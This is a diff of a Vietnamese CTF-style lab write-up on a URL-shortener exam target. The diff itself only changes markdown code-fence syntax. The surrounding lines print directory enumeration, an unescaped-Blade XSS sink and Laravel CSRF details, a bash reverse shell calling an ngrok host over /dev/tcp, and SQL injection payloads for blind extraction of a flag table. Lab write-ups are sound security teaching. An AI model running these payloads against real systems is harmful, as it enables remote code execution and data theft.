@@ -49,7 +49,7 @@ Nguyên nhân chính là do lập trình viên đã không có các biện pháp
 
 ### Step to reproduce 
 Đầu tiên, ta sử dụng công cụ `dirsearch` với lệnh:
-```bash=
+```bash
 python dirsearch.py -u https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/
 ```
 ![image](https://hackmd.io/_uploads/r1iEVl1fge.png)
@@ -218,7 +218,7 @@ Khi người dùng click vào link rút gọn, trang `safe-redirect.blade.php` s
 <p style="text-align:center"><em>File `safe-redirect.blade.php`</em></p>
 
 Trong đó, biến `$pageDescription` rơi vào `{!! !!}` ở dòng 20 - đây là cú pháp render ra tag HTML mà không có escape.
-Mà giá trị biến `$pageDescription`, được lấy từ thẻ `<meta name="description" content="{{ $pageDescription }}">` tại `default.blade.php`.
+Mà giá trị biến `$pageDescription`, được lấy từ thẻ ```html <meta name="description" content="{{ $pageDescription }}">``` tại `default.blade.php`.
 
 ![image](https://hackmd.io/_uploads/H1u4lLyMlx.png)
 <p style="text-align:center"><em>File `default.blade.php`</em></p>
@@ -265,7 +265,7 @@ Như vậy, ta có thể gửi `XSRF-TOKEN` này đến api `/generate-token` �
 Nhưng ta lại thực hiện đi lấy `X-XSRF-TOKEN`, điều này liên quan đến cơ chế bảo vệ `csrf-token` của Laravel.
 Cả hai đều cơ chế bảo vệ `csrf-token`, nhưng có chút khác biệt:
 - `X-XSRF-TOKEN` được Laravel tự tạo ra trong Cookie với mỗi response, không cần manual setup trong HTML.
-- `X-CSRF-TOKEN` được lập trình viên nhúng vào qua thẻ `<meta name="csrf-token" content="{{ csrf_token() }}">` 
+- `X-CSRF-TOKEN` được lập trình viên nhúng vào qua thẻ ```html <meta name="csrf-token" content="{{ csrf_token() }}">``` 
 
 Như vậy, khi mình truyền trong file payload là `X-XSRF-TOKEN` là để không bị phụ thuộc vào `csrf-token` đã nhúng trong thẻ `meta`.
 
@@ -395,7 +395,7 @@ Sau đó mình gửi file này lên chỗ `Restore`.
 Như vậy, mình hoàn toàn có thể tạo 1 `reverse shell` để RCE.
 
 Sau đó, mình thay đổi payload thành 1 `reverse shell` như sau: 
-```bash=
+```bash
 'bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/YOUR_PORT 0>&1"'
 ```
 
@@ -512,11 +512,11 @@ Trong đây nó chứa toàn bộ cột và bảng của database hiện tại.
 
 ### Step to reproduce 
 Đầu tiên, ta truyền vào payload đầu tiên để thực hiện đóng chuỗi.
-```bash=
+```bash
 %' AND 1='1
 ```
 Lúc đó câu lệnh query đoạn WHERE sẽ thành: 
-```bash=
+```bash
 ... WHERE links.url LIKE '%%' AND 1='1%'
 ```
 Khi so sánh `1='1%'` thì mysql sẽ luôn ép kiểu để trả về luôn đúng.
@@ -527,7 +527,7 @@ Vì nó truyền trực tiếp trên URL theo method `GET` nên phải encoded U
 <p style="text-align:center"><em>Câu query trả về toàn bộ thông tin trong bảng links</em></p>
 
 Sau đó mình truyền tiếp payload thứ hai như sau:
-```bash=
+```bash
 %' AND (SELECT DATABASE()) AND 1='1%' 
 ```
 
@@ -585,7 +585,7 @@ Tiếp theo, ở dòng 27-28, vòng lặp `while left <= right:` dùng để thu
 
 Từ dòng 29-35, `script` thực hiện kiểm tra điều kiện bằng cách gửi `payload`, nhằm kiểm tra xem ký tự tại ví trí `i` trong chuỗi dữ liệu có mã ASCII lớn hơn `mid` hay không. 
 Với `payload` thứ hai có dạng:
-```
+```SQL
 %' AND (ASCII(SUBSTRING((SELECT GROUP_CONCAT(content) FROM flag),{i},1))>{mid}) AND 1='1
 ```
 - Trong đó hàm `SUBSTRING((SELECT GROUP_CONCAT(content) FROM flag), {i}, 1)` để lấy ký tự thứ `i` từ kết quả truy vấn.
